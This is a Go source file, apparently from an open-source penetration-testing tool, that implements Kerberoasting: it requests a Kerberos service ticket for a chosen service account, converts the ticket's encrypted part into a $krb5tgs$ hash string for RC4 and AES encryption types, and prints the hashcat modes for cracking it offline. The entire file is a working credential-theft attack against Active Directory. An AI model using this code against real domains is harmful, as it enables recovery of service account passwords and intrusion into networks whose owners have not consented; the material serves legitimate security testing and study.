// MIT License
//
// # Copyright (c) 2025 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/jfjallid/gokrb5/v9/iana/etypeID"
	"github.com/jfjallid/gokrb5/v9/messages"
)

var helpKerberoastOptions = `
    Usage: ` + os.Args[0] + ` --kerberoast [options]
    ` + helpConnectionOptions + `
    options:
          --target <SPN|SAN|UPN>  Target to kerberoast. Supports multiple formats such as service/fqdn, sAMAccountName and UPN."
          --name <username>       Target username for output hash (default user)
          --krb5-conf <file>      Read krb5.conf file and use as config
`

func handleKerberoast(args *userArgs) (err error) {
	if args.spn == "" {
		fmt.Println("Must specify a --target to kerberoast")
		myFlags.Usage()
		return
	}
	st, _, err := args.c.GetServiceTicketExt(args.spn, args.dcDomain)
	if err != nil {
		log.Errorln(err)
		return
	}

	h, encType, err := extractHashFromST(st, args.targetUsername)
	if err != nil {
		log.Errorln(err)
		return
	}

	fmt.Printf("%s\n", h)
	if !args.quiet {
		switch encType {
		case etypeID.RC4_HMAC:
			fmt.Println("Crack with hashcat -m 13100 <hash.txt> <wordlist.txt>")
		case etypeID.AES128_CTS_HMAC_SHA1_96:
			fmt.Println("Crack with hashcat -m 19600 <hash.txt> <wordlist.txt>")
		case etypeID.AES256_CTS_HMAC_SHA1_96:
			fmt.Println("Crack with hashcat -m 19700 <hash.txt> <wordlist.txt>")
		}
	}

	return
}

func extractHashFromST(st messages.Ticket, user string) (hash string, encType int32, err error) {
	sb := strings.Builder{}
	encType = st.EncPart.EType

	sb.Write([]byte("$krb5tgs$"))
	switch st.EncPart.EType {
	case etypeID.RC4_HMAC:
		sb.Write([]byte(strconv.Itoa(int(etypeID.RC4_HMAC)) + "$*"))
		sb.Write([]byte(user + "$" + st.Realm + "$"))
		sb.Write([]byte(strings.ReplaceAll(st.SName.PrincipalNameString(), ":", "~") + "*$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[:16]) + "$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[16:])))
	case etypeID.AES128_CTS_HMAC_SHA1_96:
		length := len(st.EncPart.Cipher)
		sb.Write([]byte(strconv.Itoa(int(etypeID.AES128_CTS_HMAC_SHA1_96)) + "$"))
		sb.Write([]byte(user + "$" + st.Realm + "$*"))
		sb.Write([]byte(strings.ReplaceAll(st.SName.PrincipalNameString(), ":", "~") + "*$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[length-12:]) + "$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[:length-12])))
	case etypeID.AES256_CTS_HMAC_SHA1_96:
		length := len(st.EncPart.Cipher)
		sb.Write([]byte(strconv.Itoa(int(etypeID.AES256_CTS_HMAC_SHA1_96)) + "$"))
		sb.Write([]byte(user + "$" + st.Realm + "$*"))
		sb.Write([]byte(strings.ReplaceAll(st.SName.PrincipalNameString(), ":", "~") + "*$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[length-12:]) + "$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[:length-12])))
	default:
		err = fmt.Errorf("haven't implemented parsing for encryption type: %d", st.EncPart.EType)
		return
	}
	hash = sb.String()
	return
}
